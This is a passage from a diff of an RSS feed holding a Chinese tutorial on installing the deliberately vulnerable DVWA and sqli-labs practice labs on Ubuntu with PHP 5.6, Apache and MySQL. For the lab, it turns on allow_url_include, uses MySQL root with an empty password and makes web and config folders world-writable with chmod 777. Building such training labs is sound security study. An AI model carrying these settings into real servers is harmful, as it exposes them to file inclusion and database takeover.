+然后使用<code>xshell</code>连接服务器，采用<code>xftp</code>上传一键下载环境的脚本，脚本内命令如下：</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/sh
+</span><span class="cp"></span><span class="nb">echo</span> <span class="s1">&#39;\n1、新增ppa源\n&#39;</span><span class="p">;</span>
+add-apt-repository ppa:ondrej/php<span class="p">;</span>
+<span class="nb">echo</span> <span class="s1">&#39;\n2、更新本地源\n&#39;</span><span class="p">;</span>
+apt-get update <span class="o">&amp;&amp;</span> apt-get upgrade<span class="p">;</span>
+<span class="nb">echo</span> <span class="s1">&#39;\n3、安装git\n&#39;</span><span class="p">;</span>
+apt-get install git<span class="p">;</span>
+<span class="nb">echo</span> <span class="s1">&#39;\n4、安装php(5.6)\n&#39;</span><span class="p">;</span>
+apt-get install php5.6<span class="p">;</span>
+<span class="nb">echo</span> <span class="s1">&#39;\n5、安装必要的php依赖库\n&#39;</span><span class="p">;</span>
+apt-get install php5.6-mysql libapache2-mod-php5.6 php5.6-gd<span class="p">;</span>
+<span class="nb">echo</span> <span class="s1">&#39;\n6、安装apache2服务\n&#39;</span><span class="p">;</span>
+apt-get install apache2<span class="p">;</span>
+<span class="nb">echo</span> <span class="s1">&#39;\n7、设置环境为php5.6\n&#39;</span><span class="p">;</span>
+a2enmod php5.6<span class="p">;</span>
+<span class="nb">echo</span> <span class="s1">&#39;\n8重启apache2服务\n&#39;</span><span class="p">;</span>
+/etc/init.d/apache2 restart<span class="p">;</span>
+<span class="nb">echo</span> <span class="s1">&#39;\n9、安装mysql服务\n&#39;</span><span class="p">;</span>
+apt-get install mysql-server<span class="p">;</span>
+<span class="nb">echo</span> <span class="s1">&#39;\n10、切换到web服务目录，并删除默认页面\n&#39;</span><span class="p">;</span>
+<span class="nb">cd</span> /var/www/html/<span class="p">;</span>
+rm index.html<span class="p">;</span>
+<span class="nb">echo</span> <span class="s1">&#39;\n11、git下载DVWA源文件到本地\n&#39;</span><span class="p">;</span>
+git clone https://github.com/digininja/DVWA.git<span class="p">;</span>
+<span class="nb">echo</span> <span class="s1">&#39;\n12、git下载SQLI-Lab源文件到本地\n&#39;</span><span class="p">;</span>
+git clone https://github.com/Audi-1/sqli-labs.git<span class="p">;</span>
+<span class="nb">echo</span> <span class="s1">&#39;\n=========环境下载结束，请开始配置环境=========\n&#39;</span><span class="p">;</span>
+ehco <span class="s1">&#39;\n========web服务路径为：/var/www/html/========\n&#39;</span><span class="p">;</span>
+</code></pre></div><h2 id="环境配置">环境配置</h2>
+<h3 id="1php-56-环境配置">1、PHP 5.6 环境配置</h3>
+<p>首先使用<code>root</code>权限打开<code>php</code>中关于<code>apache2</code>的配置文件</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">vim /etc/php/5.6/apache2/php.ini
+</code></pre></div><p>然后在命令模式下输入：<code>/allow_url_include</code> 将后面的值，按如下方式修改：</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nv">allow_url_include</span> <span class="o">=</span> On
+</code></pre></div><h3 id="2mysql-数据库配置">2、MYSQL 数据库配置</h3>
+<p>本次安装的是最新版本的<code>mysql 8.0.21</code>，在终端直接输入<code>mysql</code>即可登录，因为密码是空！
+创建一个用于dvwa操作的数据库，命令如下：</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; create database dvwa<span class="p">;</span>
+</code></pre></div><p><strong>特别说明：如果按照上面的操作，在老版本的mysql数据库中，就满足要求并可以正常连接了，但由于版本更迭，mysql 8对数据库默认配置进行了更新，为了兼容老版本的php，还请进行以下修改！</strong>
+打开编辑mysqld配置文件：</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">vim /etc/mysql/mysql.conf.d/mysqld.cnf
+</code></pre></div><p>在<code>[mysqld]</code>下方新增以下三行命令：</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 设置密码编码格式</span>
+<span class="nv">default_authentication_plugin</span><span class="o">=</span>mysql_native_password
+<span class="c1"># 设置编码格式</span>
+character-set-server <span class="o">=</span> utf8mb4
+collation-server <span class="o">=</span> utf8mb4_unicode_ci
+
+</code></pre></div><h3 id="3-dvwa-环境配置">3、 DVWA 环境配置</h3>
+<p>首先进入<code>DVWA</code>配置文件路径；</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">cd</span> /var/www/html/DVWA/config/
+</code></pre></div><p>进行配置文件的创建；</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">cp config.inc.php.dist config.inc.php
+</code></pre></div><p>修改配置文件中的数据库连接项；</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="c1">#####原始数据如下#####
+</span><span class="c1"></span><span class="nv">$_DVWA</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+<span class="nv">$_DVWA</span><span class="p">[</span> <span class="s1">&#39;db_server&#39;</span> <span class="p">]</span>   <span class="o">=</span> <span class="s1">&#39;127.0.0.1&#39;</span><span class="p">;</span>
+<span class="nv">$_DVWA</span><span class="p">[</span> <span class="s1">&#39;db_database&#39;</span> <span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;dvwa&#39;</span><span class="p">;</span>
+<span class="nv">$_DVWA</span><span class="p">[</span> <span class="s1">&#39;db_user&#39;</span> <span class="p">]</span>     <span class="o">=</span> <span class="s1">&#39;dvwa&#39;</span><span class="p">;</span>
+<span class="nv">$_DVWA</span><span class="p">[</span> <span class="s1">&#39;db_password&#39;</span> <span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;p@ssw0rd&#39;</span><span class="p">;</span>
+<span class="c1">#####本次修改内容如下#####
+</span><span class="c1"></span><span class="nv">$_DVWA</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+<span class="nv">$_DVWA</span><span class="p">[</span> <span class="s1">&#39;db_server&#39;</span> <span class="p">]</span>   <span class="o">=</span> <span class="s1">&#39;127.0.0.1&#39;</span><span class="p">;</span>
+<span class="nv">$_DVWA</span><span class="p">[</span> <span class="s1">&#39;db_database&#39;</span> <span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;dvwa&#39;</span><span class="p">;</span>
+<span class="nv">$_DVWA</span><span class="p">[</span> <span class="s1">&#39;db_user&#39;</span> <span class="p">]</span>     <span class="o">=</span> <span class="s1">&#39;root&#39;</span><span class="p">;</span>
+<span class="nv">$_DVWA</span><span class="p">[</span> <span class="s1">&#39;db_password&#39;</span> <span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</code></pre></div><p>设置文件夹可写权限：</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">chmod <span class="m">777</span> -R /var/www/html/dvwa/hackable/uploads/
+chmod <span class="m">777</span> /var/www/html/dvwa/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt
+chmod <span class="m">777</span> -R /var/www/html/dvwa/config
+</code></pre></div><p>关于<code>reCAPTCHA key: Missing</code>，是调用google的验证码接口，用来做安全测试，但是调用接口需要梯子，本地测试，可以不填写，如果想体验，可百度自行替换。</p>
+<h3 id="4sqli-lab环境配置">4、SQLI-Lab环境配置</h3>
+<p>编辑配置文件<code>vim /var/www/html/sqli-labs/sql-connections/db-creds.inc</code>，填写数据库的用户名（<code>$dbuser</code>）密码（<code>$dbpass</code>）。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$dbuser</span> <span class="o">=</span><span class="s1">&#39;root&#39;</span><span class="p">;</span>
+<span class="nv">$dbpass</span> <span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
+<span class="nv">$dbname</span> <span class="o">=</span><span class="s2">&#34;security&#34;</span><span class="p">;</span>
+<span class="nv">$host</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
+<span class="nv">$dbname1</span> <span class="o">=</span> <span class="s2">&#34;challenges&#34;</span><span class="p">;</span>
+</code></pre></div><p>浏览器输入ip地址，访问首页，逐步点击即可完成实验室搭建，但由于数据库版本采用的是最新的，所以老旧的历史漏洞不能成功复现。</p>
+]]></content>
+		</item>
+		
+	</channel>
+</rss>
